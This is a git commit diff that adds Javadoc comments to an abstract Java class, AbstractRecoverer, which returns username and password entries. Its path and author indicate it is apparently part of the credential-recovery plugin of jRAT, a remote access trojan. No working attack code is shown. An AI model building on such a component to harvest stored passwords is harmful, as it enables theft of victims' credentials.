44c89ea008d01145cef19aee1b729cff63941ac3
redpois0n <red@cmail.nu>
2016-01-09 10:30:17 +0100

    Some comments

--- stub/src/jrat/plugin/recovery/stub/programs/AbstractRecoverer.java
+++ stub/src/jrat/plugin/recovery/stub/programs/AbstractRecoverer.java
@@ -4,8 +4,15 @@ import java.util.List;
 
 public abstract class AbstractRecoverer {
 	
+	/**
+	 * @return A list of string arrays for each entry, sorted in the order username, password, other
+	 * @throws Exception
+	 */
 	public abstract List<String[]> recover() throws Exception;
 	
+	/**
+	 * @return the name of the application
+	 */
 	public abstract String getName();
 
 }
